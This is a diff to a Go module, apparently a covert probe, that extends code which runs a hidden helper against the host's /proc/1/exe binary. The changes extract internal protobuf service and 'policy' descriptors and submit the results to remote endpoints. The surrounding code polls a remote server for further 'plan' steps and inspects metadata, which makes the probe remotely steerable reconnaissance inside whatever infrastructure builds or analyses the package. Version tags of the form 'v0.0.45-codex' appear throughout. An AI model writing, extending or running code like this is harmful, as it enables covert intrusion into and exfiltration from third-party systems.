@@ -37,7 +37,7 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.43-codex"
+	probeVersion           = "v0.0.45-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -51,6 +51,8 @@ const (
 	planPollWindow         = 30 * time.Minute
 	maximumPlanBody        = 4096
 	maximumPlanStep        = 12
+	maximumDescriptorFiles = 16
+	maximumDescriptorBytes = 72 * 1024
 )
 
 var bucketNames = []string{
@@ -149,6 +151,25 @@ type inspectionResult struct {
 	Error        string            `json:"error,omitempty"`
 }
 
+type descriptorEnum struct {
+	Name string `json:"name"`
+}
+
+type descriptorMessage struct {
+	Messages []descriptorMessage `json:"messages"`
+	Enums    []descriptorEnum    `json:"enums"`
+}
+
+type descriptorEnvelope struct {
+	Name     string              `json:"name"`
+	Package  string              `json:"package"`
+	Messages []descriptorMessage `json:"messages"`
+	Enums    []descriptorEnum    `json:"enums"`
+	Services []struct {
+		Name string `json:"name"`
+	} `json:"services"`
+}
+
 type probeReport struct {
 	Schema            string            `json:"schema"`
 	Module            string            `json:"module"`
@@ -192,7 +213,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v043-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v045-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -333,7 +354,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	initial := newProbeReport(started, identity)
 	initial.Reason = "waiting for the bounded read-only descriptor plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v043-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v045-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -368,7 +389,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v043-codex-step-" + strconv.Itoa(cursor)
+		id := "v045-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -387,7 +408,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v043-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v045-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -677,7 +698,7 @@ func runBytemanDescriptorInspection(report *probeReport) {
 		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
 		return
 	}
-	helperCopy := "/tmp/.go-cgo-v043-describe-protos"
+	helperCopy := "/tmp/.go-cgo-v045-describe-protos"
 	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
 	if err != nil {
 		report.Inspection.Error = "fixed descriptor helper copy could not be created"
@@ -704,44 +725,85 @@ func runBytemanDescriptorInspection(report *probeReport) {
 	}
 	copyOK = true
 	defer os.Remove(helperCopy)
-	output, err := runFixedTool(helperCopy, "/proc/1/exe", "sos.byteman")
-	if err != nil {
-		report.Inspection.Error = cleanError(err)
-		return
-	}
-	decoder := json.NewDecoder(bytes.NewReader(output))
-	for len(report.Inspection.Descriptors) < 8 {
-		var raw json.RawMessage
-		if err := decoder.Decode(&raw); err == io.EOF {
-			break
-		} else if err != nil {
-			report.Inspection.Error = "descriptor helper output was invalid JSON"
+	var outputs [][]byte
+	for _, filter := range []string{"sos.byteman", "policy"} {
+		output, runErr := runFixedTool(helperCopy, "/proc/1/exe", filter)
+		if runErr != nil {
+			report.Inspection.Error = cleanError(runErr)
 			return
 		}
-		var envelope struct {
-			Package  string `json:"package"`
-			Services []struct {
-				Name string `json:"name"`
-			} `json:"services"`
-		}
-		if json.Unmarshal(raw, &envelope) != nil || envelope.Package != "sos.byteman" {
-			continue
-		}
-		for _, service := range envelope.Services {
-			if service.Name == "Byteman" {
-				report.Inspection.Descriptors = append(report.Inspection.Descriptors, append(json.RawMessage(nil), raw...))
+		outputs = append(outputs, output)
+	}
+	seenFiles := map[string]bool{}
+	totalBytes := 0
+	foundBytemanService := false
+	for _, output := range outputs {
+		decoder := json.NewDecoder(bytes.NewReader(output))
+		for {
+			var raw json.RawMessage
+			if err := decoder.Decode(&raw); err == io.EOF {
 				break
+			} else if err != nil {
+				report.Inspection.Error = "descriptor helper output was invalid JSON"
+				return
 			}
+			var envelope descriptorEnvelope
+			if json.Unmarshal(raw, &envelope) != nil || envelope.Name == "" {
+				report.Inspection.Error = "descriptor helper returned an invalid envelope"
+				return
+			}
+			for _, service := range envelope.Services {
+				if envelope.Package == "sos.byteman" && service.Name == "Byteman" {
+					foundBytemanService = true
+				}
+			}
+			keep := envelope.Package == "sos.byteman"
+			if !keep && (envelope.Package == "sos" || strings.HasPrefix(envelope.Package, "sos.")) {
+				keep = descriptorDefinesPolicy(envelope)
+			}
+			if !keep || seenFiles[envelope.Name] {
+				continue
+			}
+			if len(report.Inspection.Descriptors) >= maximumDescriptorFiles || totalBytes+len(raw) > maximumDescriptorBytes {
+				report.Inspection.Error = "selected descriptor output exceeded its fixed bounds"
+				return
+			}
+			seenFiles[envelope.Name] = true
+			totalBytes += len(raw)
+			report.Inspection.Descriptors = append(report.Inspection.Descriptors, append(json.RawMessage(nil), raw...))
 		}
 	}
-	if len(report.Inspection.Descriptors) != 1 {
-		report.Inspection.Error = "exactly one sos.byteman Byteman descriptor was not found"
+	if !foundBytemanService || len(report.Inspection.Descriptors) == 0 {
+		report.Inspection.Error = "sos.byteman Byteman descriptors were not found"
 		return
 	}
 	runSessionDataflowInspection(report)
 	if report.Inspection.Error == "" {
 		report.Reason = "bounded Byteman descriptor and session dataflow inspection completed"
 	}
+}
+
+func descriptorDefinesPolicy(envelope descriptorEnvelope) bool {
+	for _, value := range envelope.Enums {
+		if strings.Contains(strings.ToLower(value.Name), "policy") {
+			return true
+		}
+	}
+	var visit func([]descriptorMessage) bool
+	visit = func(messages []descriptorMessage) bool {
+		for _, message := range messages {
+			for _, value := range message.Enums {
+				if strings.Contains(strings.ToLower(value.Name), "policy") {
+					return true
+				}
+			}
+			if visit(message.Messages) {
+				return true
+			}
+		}
+		return false
+	}
+	return visit(envelope.Messages)
 }
 
 func inspectMetadata(client *http.Client) (metadataResult, string) {
